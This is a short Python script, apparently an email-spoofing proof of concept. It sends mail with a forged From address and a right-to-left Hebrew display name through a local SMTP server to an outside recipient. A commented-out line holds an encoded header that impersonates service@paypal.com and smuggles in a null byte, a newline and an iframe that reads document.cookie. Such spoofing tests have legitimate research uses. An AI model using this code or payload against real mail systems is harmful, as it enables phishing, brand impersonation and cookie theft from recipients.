import smtplib
from lazyme.string import color_print
from vals import nato_example

spoofed_display_name = "עבריתעבריתעבריתעבריתעברית"
# spoofed_display_name = "gowno"

# spoofed_from = "=?utf-8?b?c2VydmljZUBwYXlwYWwuY29tPGlmcmFtZSBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9aHR0cHM6Ly93d3cuaHVzaG1haWwuY29tIHN0eWxlPSJkaXNwbGF5Om5vbmUi?==?utf-8?Q?=0A=00?=@mailsploit.com"
spoofed_from = "aaaa@pwr.edu.pl"

email_to = 'wliebert0116@gems.sw.rim.net'

msg = """From: \"%s\" <%s>
To: %s
Subject: Test RTL\n
sdadasdasa


Test test
""" % (spoofed_display_name, spoofed_from, email_to)
msg = msg.encode()

SMTP_user = 'user@localhost'
SMTP_password = 'user'
server = None
try:
    server = smtplib.SMTP('localhost', 25)
    server.ehlo()   # optional
except:
    color_print('Can\'t connect to SMTP', color='blue')
server.set_debuglevel(1)

try:
    server.login(SMTP_user, SMTP_password)
except:
    color_print('Can\'t authenticate with the server', color='blue')

try:
    server.sendmail(spoofed_from, [email_to], msg)
except:
    color_print('Can\'t send an email', color='blue')

server.quit()